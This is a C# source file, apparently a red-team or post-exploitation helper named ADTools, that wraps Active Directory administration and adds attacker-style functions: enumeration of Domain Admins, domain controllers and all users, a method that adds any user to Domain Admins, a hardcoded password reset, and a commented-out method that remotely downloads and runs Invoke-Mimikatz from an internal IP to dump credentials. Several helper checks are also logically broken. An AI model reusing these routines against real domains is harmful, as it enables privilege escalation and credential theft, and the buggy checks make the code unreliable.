using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.DirectoryServices.AccountManagement;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace ADTools
{
    class ActiveDirectory
    {
        #region Variables

        public string sDomain { get; set; }
        private string[] SplitDomain { get { return sDomain.Split('.'); } set { } }
        private string sDefaultOU { get { return string.Format("OU=Users,DC={0},DC={1}", SplitDomain[0], SplitDomain[1]); } set { } }
        private string sDefaultRootOU { get { return string.Format("DC={0},DC{1}", SplitDomain[0], SplitDomain[1]); } set { } }
        public string sServiceUser { get; set; }
        public string sServicePassword { get; set; }

        #endregion

        #region Validate Methods

        /// <summary>
        /// Validates the username and password of a given user
        /// </summary>
        /// <param name="sUserName">The username to validate</param>
        /// <param name="sPassword">The password of the username to validate</param>
        /// <returns>Returns True of user is valid</returns>
        public bool ValidateCredentials(string sUserName, string sPassword)
        {
            PrincipalContext oPrincipalContext = GetPrincipalContext();
            return oPrincipalContext.ValidateCredentials(sUserName, sPassword);
        }

        /// <summary>
        /// Checks if the User Account is Expired
        /// </summary>
        /// <param name="sUserName">The username to check</param>
        /// <returns>Returns true if Expired</returns>
        public bool IsUserExpired(string sUserName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            if (oUserPrincipal.AccountExpirationDate != null)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        /// <summary>
        /// Checks if user exists on AD
        /// </summary>
        /// <param name="sUserName">The username to check</param>
        /// <returns>Returns true if username Exists</returns>
        public bool IsUserExisiting(string sUserName)
        {
            if (GetUser(sUserName) == null)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        /// <summary>
        /// Checks if user account is locked
        /// </summary>
        /// <param name="sUserName">The username to check</param>
        /// <returns>Returns true of Account is locked</returns>
        public bool IsAccountLocked(string sUserName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            return oUserPrincipal.IsAccountLockedOut();
        }
        #endregion

        #region Search Methods

        /// <summary>
        /// Gets a certain user on Active Directory
        /// </summary>
        /// <param name="sUserName">The username to get</param>
        /// <returns>Returns the UserPrincipal Object</returns>
        public UserPrincipal GetUser(string sUserName)
        {
            PrincipalContext oPrincipalContext = GetPrincipalContext();

            UserPrincipal oUserPrincipal =
               UserPrincipal.FindByIdentity(oPrincipalContext, sUserName);
            return oUserPrincipal;
        }

        public void GetUserData(string sUserName)
        {
            PrincipalContext oPrincipalContext = GetPrincipalContext();

            UserPrincipal oUserPrincipal =
               UserPrincipal.FindByIdentity(oPrincipalContext, sUserName);
            PrintUserData(oUserPrincipal);
        }

        /// <summary>
        /// Gets a certain group on Active Directory
        /// </summary>
        /// <param name="sGroupName">The group to get</param>
        /// <returns>Returns the GroupPrincipal Object</returns>
        public GroupPrincipal GetGroup(string sGroupName)
        {
            PrincipalContext oPrincipalContext = GetPrincipalContext();

            GroupPrincipal oGroupPrincipal =
               GroupPrincipal.FindByIdentity(oPrincipalContext, sGroupName);
            return oGroupPrincipal;
        }

        public List<GroupPrincipal> ListGroups()
        {
            PrincipalContext oPrincipalContext = GetPrincipalContext();
            GroupPrincipal gp = new GroupPrincipal(oPrincipalContext);
            List<GroupPrincipal> oGroupPrincipals = new List<GroupPrincipal>();
            using (PrincipalSearcher ps = new PrincipalSearcher(gp))
            {
                using (PrincipalSearchResult<Principal> allPrincipals = ps.FindAll())
                {
                    oGroupPrincipals.AddRange(allPrincipals.OfType<GroupPrincipal>());
                }
            }
            return oGroupPrincipals;
        }

        #endregion

        #region User Account Methods

        /// <summary>
        /// Sets the user password
        /// </summary>
        /// <param name="sUserName">The username to set</param>
        /// <param name="sNewPassword">The new password to use</param>
        /// <param name="sMessage">Any output messages</param>
        public void SetUserPassword(string sUserName, string sNewPassword, out string sMessage)
        {
            try
            {
                UserPrincipal oUserPrincipal = GetUser(sUserName);
                oUserPrincipal.SetPassword(sNewPassword);
                sMessage = "";
            }
            catch (Exception ex)
            {
                sMessage = ex.Message;
            }
        }

        /// <summary>
        /// Enables a disabled user account
        /// </summary>
        /// <param name="sUserName">The username to enable</param>
        public void EnableUserAccount(string sUserName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            oUserPrincipal.Enabled = true;
            oUserPrincipal.Save();
        }

        /// <summary>
        /// Force disabling of a user account
        /// </summary>
        /// <param name="sUserName">The username to disable</param>
        public void DisableUserAccount(string sUserName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            oUserPrincipal.Enabled = false;
            oUserPrincipal.Save();
        }

        /// <summary>
        /// Force expire password of a user
        /// </summary>
        /// <param name="sUserName">The username to expire the password</param>
        public void ExpireUserPassword(string sUserName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            oUserPrincipal.ExpirePasswordNow();
            oUserPrincipal.Save();
        }

        /// <summary>
        /// Unlocks a locked user account
        /// </summary>
        /// <param name="sUserName">The username to unlock</param>
        public void UnlockUserAccount(string sUserName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            oUserPrincipal.UnlockAccount();
            oUserPrincipal.Save();
        }

        /// <summary>
        /// Creates a new user on Active Directory
        /// </summary>
        /// <param name="sOU">The OU location you want to save your user</param>
        /// <param name="sUserName">The username of the new user</param>
        /// <param name="sPassword">The password of the new user</param>
        /// <param name="sGivenName">The given name of the new user</param>
        /// <param name="sSurname">The surname of the new user</param>
        /// <returns>returns the UserPrincipal object</returns>
        public UserPrincipal CreateNewUser(string sOU,
           string sUserName, string sPassword, string sGivenName, string sSurname)
        {
            if (!IsUserExisiting(sUserName))
            {
                PrincipalContext oPrincipalContext = GetPrincipalContext();

                UserPrincipal oUserPrincipal = new UserPrincipal
                   (oPrincipalContext, sUserName, sPassword, true /*Enabled or not*/);

                //User Log on Name
                oUserPrincipal.UserPrincipalName = sUserName;
                oUserPrincipal.GivenName = sGivenName;
                oUserPrincipal.Surname = sSurname;
                oUserPrincipal.Save();

                return oUserPrincipal;
            }
            else
            {
                return GetUser(sUserName);
            }
        }

        /// <summary>
        /// Deletes a user in Active Directory
        /// </summary>
        /// <param name="sUserName">The username you want to delete</param>
        /// <returns>Returns true if successfully deleted</returns>
        public bool DeleteUser(string sUserName)
        {
            try
            {
                UserPrincipal oUserPrincipal = GetUser(sUserName);

                oUserPrincipal.Delete();
                return true;
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region Group Methods

        /// <summary>
        /// Creates a new group in Active Directory
        /// </summary>
        /// <param name="sOU">The OU location you want to save your new Group</param>
        /// <param name="sGroupName">The name of the new group</param>
        /// <param name="sDescription">The description of the new group</param>
        /// <param name="oGroupScope">The scope of the new group</param>
        /// <param name="bSecurityGroup">True is you want this group 
        /// to be a security group, false if you want this as a distribution group</param>
        /// <returns>Returns the GroupPrincipal object</returns>
        public GroupPrincipal CreateNewGroup(string sOU, string sGroupName,
           string sDescription, GroupScope oGroupScope, bool bSecurityGroup)
        {
            PrincipalContext oPrincipalContext = GetPrincipalContext(sOU);

            GroupPrincipal oGroupPrincipal = new GroupPrincipal(oPrincipalContext, sGroupName);
            oGroupPrincipal.Description = sDescription;
            oGroupPrincipal.GroupScope = oGroupScope;
            oGroupPrincipal.IsSecurityGroup = bSecurityGroup;
            oGroupPrincipal.Save();

            return oGroupPrincipal;
        }

        /// <summary>
        /// Adds the user for a given group
        /// </summary>
        /// <param name="sUserName">The user you want to add to a group</param>
        /// <param name="sGroupName">The group you want the user to be added in</param>
        /// <returns>Returns true if successful</returns>
        public bool AddUserToGroup(string sUserName, string sGroupName)
        {
            try
            {
                UserPrincipal oUserPrincipal = GetUser(sUserName);
                GroupPrincipal oGroupPrincipal = GetGroup(sGroupName);
                if (oUserPrincipal == null || oGroupPrincipal == null)
                {
                    if (!IsUserGroupMember(sUserName, sGroupName))
                    {
                        oGroupPrincipal.Members.Add(oUserPrincipal);
                        oGroupPrincipal.Save();
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Removes user from a given group
        /// </summary>
        /// <param name="sUserName">The user you want to remove from a group</param>
        /// <param name="sGroupName">The group you want the user to be removed from</param>
        /// <returns>Returns true if successful</returns>
        public bool RemoveUserFromGroup(string sUserName, string sGroupName)
        {
            try
            {
                UserPrincipal oUserPrincipal = GetUser(sUserName);
                GroupPrincipal oGroupPrincipal = GetGroup(sGroupName);
                if (oUserPrincipal == null || oGroupPrincipal == null)
                {
                    if (IsUserGroupMember(sUserName, sGroupName))
                    {
                        oGroupPrincipal.Members.Remove(oUserPrincipal);
                        oGroupPrincipal.Save();
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Checks if user is a member of a given group
        /// </summary>
        /// <param name="sUserName">The user you want to validate</param>
        /// <param name="sGroupName">The group you want to check the 
        /// membership of the user</param>
        /// <returns>Returns true if user is a group member</returns>
        public bool IsUserGroupMember(string sUserName, string sGroupName)
        {
            UserPrincipal oUserPrincipal = GetUser(sUserName);
            GroupPrincipal oGroupPrincipal = GetGroup(sGroupName);

            if (oUserPrincipal == null || oGroupPrincipal == null)
            {
                return oGroupPrincipal.Members.Contains(oUserPrincipal);
            }
            else
            {
                return false;
            }
        }

        /// <summary>
        /// Gets a list of the users group memberships
        /// </summary>
        /// <param name="sUserName">The user you want to get the group memberships</param>
        /// <returns>Returns an arraylist of group memberships</returns>
        public ArrayList GetUserGroups(string sUserName)
        {
            ArrayList myItems = new ArrayList();
            UserPrincipal oUserPrincipal = GetUser(sUserName);

            PrincipalSearchResult<Principal> oPrincipalSearchResult = oUserPrincipal.GetGroups();

            foreach (Principal oResult in oPrincipalSearchResult)
            {
                myItems.Add(oResult.Name);
            }
            return myItems;
        }

        public List<Principal> ListUserGroups(string sUserName)
        {
            List<Principal> myItems = new List<Principal>();//ArrayList myItems = new ArrayList();
            UserPrincipal oUserPrincipal = GetUser(sUserName);

            PrincipalSearchResult<Principal> oPrincipalSearchResult = oUserPrincipal.GetGroups();
            int count = oPrincipalSearchResult.Count();
            foreach (Principal oResult in oPrincipalSearchResult)
            {
                myItems.Add(oResult);
            }
            return myItems;
        }

        public List<Principal> ListGroupMembership(string sGroupName)
        {
            List<Principal> myItems = new List<Principal>();
            GroupPrincipal oGroupPrincipal = GetGroup(sGroupName);

            PrincipalSearchResult<Principal> oPrincipalSearchResult = oGroupPrincipal.GetGroups();
            int count = oPrincipalSearchResult.Count();
            foreach(Principal oResult in oPrincipalSearchResult)
            {
                myItems.Add(oResult);
            }
            return myItems;
        }

        /// <summary>
        /// Gets a list of the users authorization groups
        /// </summary>
        /// <param name="sUserName">The user you want to get authorization groups</param>
        /// <returns>Returns an arraylist of group authorization memberships</returns>
        public ArrayList GetUserAuthorizationGroups(string sUserName)
        {
            ArrayList myItems = new ArrayList();
            UserPrincipal oUserPrincipal = GetUser(sUserName);

            PrincipalSearchResult<Principal> oPrincipalSearchResult =
                       oUserPrincipal.GetAuthorizationGroups();

            foreach (Principal oResult in oPrincipalSearchResult)
            {
                myItems.Add(oResult.Name);
            }
            return myItems;
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Gets the base principal context
        /// </summary>
        /// <returns>Returns the PrincipalContext object</returns>
        public PrincipalContext GetPrincipalContext()
        {
            PrincipalContext context = new PrincipalContext(ContextType.Domain, sDomain, sServiceUser, sServicePassword);
            return context;
        }

        /// <summary>
        /// Gets the principal context on specified OU
        /// </summary>
        /// <param name="sOU">The OU you want your Principal Context to run on</param>
        /// <returns>Returns the PrincipalContext object</returns>
        public PrincipalContext GetPrincipalContext(string sOU)
        {
            PrincipalContext oPrincipalContext =
               new PrincipalContext(ContextType.Domain, sDomain, sOU,
               ContextOptions.SimpleBind, sServiceUser, sServicePassword);
            return oPrincipalContext;
        }

        #endregion

        #region Lookup Methods

        public void Test(string groupName)
        {
            using (var context = this.GetPrincipalContext())
            {
                using (var group = GroupPrincipal.FindByIdentity(context, groupName))
                {

                    if (group == null)
                    {
                        Console.WriteLine("Group does not exist.");
                    }
                    else
                    {
                        Console.WriteLine("Group = " + group.SamAccountName);
                        var users = group.GetMembers(true);
                        foreach (UserPrincipal user in users)
                        {
                            Console.WriteLine(user.SamAccountName);
                        }
                    }
                }
            }
        }

        public void PrintDomainAdmins()
        {
            Console.WriteLine("\n\n[+] Domain Admins");
            Console.WriteLine("-----------------");
            GroupPrincipal gp = GetGroup("Domain Admins");
            Console.WriteLine("[+] Count (" + gp.Members.Count + ")");
            foreach (Principal pc in gp.Members)
            {
                if (pc.StructuralObjectClass.ToLower() == "user")
                {
                    PrintUserData(pc as UserPrincipal);
                }
                else
                {
                    PrintDomainAdmins(pc.Name);
                }
            }
            Console.WriteLine("-----------------");
        }

        public void PrintDomainAdmins(string groupName)
        {
            GroupPrincipal gp = GetGroup(groupName);
            Console.WriteLine("[+] Count (" + gp.Members.Count + ")");
            foreach (Principal pc in gp.Members)
            {
                if (pc.StructuralObjectClass.ToLower() == "user")
                {
                    PrintUserData(pc as UserPrincipal);
                }
                else
                {
                    PrintDomainAdmins(pc.Name);
                }
            }
        }

        public void PrintGroupMembers(string group)
        {
            Console.WriteLine(string.Format("\n\n[+] {0}", group));
            Console.WriteLine("-----------------");
            GroupPrincipal gp = GetGroup(group);
            Console.WriteLine("[+] Count (" + gp.Members.Count + ")");
            foreach (Principal pc in gp.Members)
            {

                if (pc.StructuralObjectClass.ToLower() == "user")
                {
                    PrintUserData(pc as UserPrincipal);
                }
                else
                {
                    PrintDomainAdmins(pc.Name);
                }
            }
            Console.WriteLine("-----------------");
        }

        public void PrintAllUsers()
        {
            Console.WriteLine("[+] Domain Users");
            Console.WriteLine("-----------------");
            GroupPrincipal gp = GetGroup("Domain Users");
            Console.WriteLine("[+] Count (" + gp.Members.Count + ")");
            foreach (Principal pc in gp.Members)
            {
                if (pc.StructuralObjectClass.ToLower() == "user")
                {
                    PrintUserData(pc as UserPrincipal);
                }

                if (pc.StructuralObjectClass.ToLower() == "computer")
                {
                    PrintComputerData(pc as ComputerPrincipal);
                    
                }
            }

            Console.WriteLine("-----------------");
        }

        public void PrintUser(string user)
        {
            try
            {
                Console.WriteLine(string.Format("[+] {0}", user));
                Console.WriteLine("-----------------");
                UserPrincipal up = GetUser(user);
                PrintUserData(up);
                Console.WriteLine("\n\n");

                Console.WriteLine("-----------------");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("\n\n");

                Console.WriteLine("-----------------");
            }
        }

        public void UnlockUser(string user)
        {
            UserPrincipal up = GetUser(user);
            up.UnlockAccount();
        }

        public void ChangeUserPassword(string user)
        {
            UserPrincipal up = GetUser(user);
            up.SetPassword("B3h0ldTh3C0nqu3r1ngH3r0#1");
        }

        public void AddToDA(string user)
        {
            Console.WriteLine(AddUserToGroup(user, "Domain Admins"));
        }

        //doesn't seem to work.  Throws some errors.
        //public void InvokeMimikatz(string remoteComputer, string user, string pass)
        //{
        //    string userName = string.Format("thornburg\\{0}", user);
        //    var credentials = new PSCredential(userName, ConvertToSecureString(pass));
        //    var connection = new WSManConnectionInfo(true, remoteComputer, 5986, "/wsman", "http://schemas.microsoft.com/powershell/Microsoft.PowerShell", credentials);
        //    var runspace = RunspaceFactory.CreateRunspace(connection);//.CreateRunstpace(connection);
        //    runspace.Open();
        //    var powershell = PowerShell.Create();
        //    powershell.Runspace = runspace;
        //    powershell.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://172.16.40.85/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds");
        //    var results = powershell.Invoke();
        //    Console.WriteLine(results);
        //}

        private SecureString ConvertToSecureString(string pass)
        {
            SecureString s = new SecureString();
            foreach(char c in pass)
            {
                s.AppendChar(c);
            }
            return s;
        }

        private void PrintUserName(UserPrincipal up)
        {
            Console.WriteLine(up.SamAccountName);
        }

        private void PrintUserData(UserPrincipal up)
        {
            Console.WriteLine("SID: " + up.Sid);
            Console.WriteLine("SAM ACCOUNT NAME: " + up.SamAccountName);
            Console.WriteLine("UPN: " + up.UserPrincipalName);
            Console.WriteLine("DISPLAY NAME: " + up.DisplayName);
            Console.WriteLine("DISTINGUISHED NAME: " + up.DistinguishedName);
            Console.WriteLine("HOME DIRECTORY: " + up.HomeDirectory);
            Console.WriteLine("REVERSIBLE PASS?: " + up.AllowReversiblePasswordEncryption);
            Console.WriteLine("LOCKED OUT?: " + up.IsAccountLockedOut());
            Console.WriteLine("LAST PASSWORD SET: " + up.LastPasswordSet);
            Console.WriteLine("\n\n");
        }

        private void PrintComputerData(ComputerPrincipal cp)
        {
            Console.WriteLine("SID: " + cp.Sid);
            Console.WriteLine("SAM ACCOUNT NAME: " + cp.SamAccountName);
            Console.WriteLine("UPN: " + cp.UserPrincipalName);
            Console.WriteLine("DISPLAY NAME: " + cp.DisplayName);
            Console.WriteLine("DISTINGUISHED NAME: " + cp.DistinguishedName);
            Console.WriteLine("Certificates:\n");
            Console.WriteLine("\n\n");
        }

        public void PrintDomainSystems()
        {
            Console.WriteLine("\n\n[+] Domain Systems");
            Console.WriteLine("-----------------");
            GroupPrincipal gp = GetGroup("Domain Computers");
            Console.WriteLine("[+] Count (" + gp.Members.Count + ")");
            foreach (Principal pc in gp.Members)
            {
                if (pc.StructuralObjectClass.ToLower() == "computer")
                {
                    ComputerPrincipal cp = pc as ComputerPrincipal;
                    Console.WriteLine("SID: " + cp.Sid);
                    Console.WriteLine("SAM ACCOUNT NAME: " + cp.SamAccountName);
                    Console.WriteLine("UPN: " + cp.UserPrincipalName);
                    Console.WriteLine("DISPLAY NAME: " + cp.DisplayName);
                    Console.WriteLine("DISTINGUISHED NAME: " + cp.DistinguishedName);
                    Console.WriteLine("Certificates:\n");
                    Console.WriteLine("\n\n");
                }
            }
        }

        public void PrintDCSystems()
        {
            Console.WriteLine("\n\n[+] Domain Controllers");
            Console.WriteLine("-----------------");
            GroupPrincipal gp = GetGroup("Domain Controllers");
            Console.WriteLine("[+] Count (" + gp.Members.Count + ")");
            foreach (Principal pc in gp.Members)
            {
                if (pc.StructuralObjectClass.ToLower() == "computer")
                {
                    ComputerPrincipal cp = pc as ComputerPrincipal;
                    Console.WriteLine("SID: " + cp.Sid);
                    Console.WriteLine("SAM ACCOUNT NAME: " + cp.SamAccountName);
                    Console.WriteLine("UPN: " + cp.UserPrincipalName);
                    Console.WriteLine("DISPLAY NAME: " + cp.DisplayName);
                    Console.WriteLine("DISTINGUISHED NAME: " + cp.DistinguishedName);
                    Console.WriteLine("Certificates:\n");
                    Console.WriteLine("\n\n");
                }
            }
        }

        //RE-WRITE
        public void AttemptUserCreation(string userName, string password, string firstName, string lastName, string group)
        {
            Console.WriteLine("\n\n[+] Add User to Domain");
            Console.WriteLine("-----------------");
            try
            {
                UserPrincipal up = CreateNewUser(sDefaultOU, userName, password, firstName, lastName);
                Console.WriteLine(string.Format("User Created:  Username: {0}, Password: {1}", userName, password));
                if(group != string.Empty)
                    AttempAddGroup(userName, group);
            }
            catch (Exception ex)
            {
                Console.WriteLine("User Creation Failed!\n" + ex.Message);
            }
            Console.WriteLine("-----------------");
        }

        //RE-WRITE
        public void AttempAddGroup(string userName, string groupName)
        {
            Console.WriteLine(string.Format("\n\n[+] Add User to {0}", groupName));
            Console.WriteLine("-----------------");
            try
            {
                bool test1 = AddUserToGroup(userName, groupName);
                UserPrincipal up = GetUser(userName);
                var groups = up.GetAuthorizationGroups();
                Console.WriteLine(string.Format("Add User {0} to {1} group", userName, groupName));
            }
            catch (Exception ex)
            {
                Console.WriteLine(string.Format("Could not add user to {0} group!\n", groupName) + ex.Message);
            }
            Console.WriteLine("-----------------");
        }

        public void CertificatePrint(X509Certificate2 x509)
        {
            Console.WriteLine("\n---------------------------\n");
            Console.WriteLine(
           "\nIssued to {0}\nIssued by {1}\nSerial# {2}\n"
           + "From {3} To {4}\nAlgo {5} Params {6}\n"
           + "Format {7}\n"
           + "Cert Hash\n{8}\nCert Data\n{9}\nPublic Key\n{10}\nPrivate Key{11}",
           x509.Subject, x509.Issuer, x509.GetSerialNumberString(),
           x509.GetEffectiveDateString(), x509.GetExpirationDateString(),
           x509.GetKeyAlgorithm(), x509.GetKeyAlgorithmParametersString(),
           x509.GetFormat(), x509.GetCertHashString(), x509.GetRawCertDataString(),
           x509.GetPublicKeyString(), x509.PrivateKey);
            Console.WriteLine("\n---------------------------\n");
        }

        public void PrintUserGroups(string userName)
        {
            List<Principal> list = ListUserGroups(userName);
            foreach (Principal p in list)
            {
                Console.WriteLine(p.SamAccountName);
            }
        }

        public void PrintGroups()
        {
            List<GroupPrincipal> list = ListGroups();
            foreach (GroupPrincipal p in list)
            {
                Console.WriteLine(p.SamAccountName);
            }
        }

        public void PrintGroupGroups(string groupName)
        {
            List<Principal> list = ListGroupMembership(groupName);
            foreach(Principal p in list)
            {
                Console.WriteLine(p.SamAccountName);
            }
        }

        #endregion
    }
}
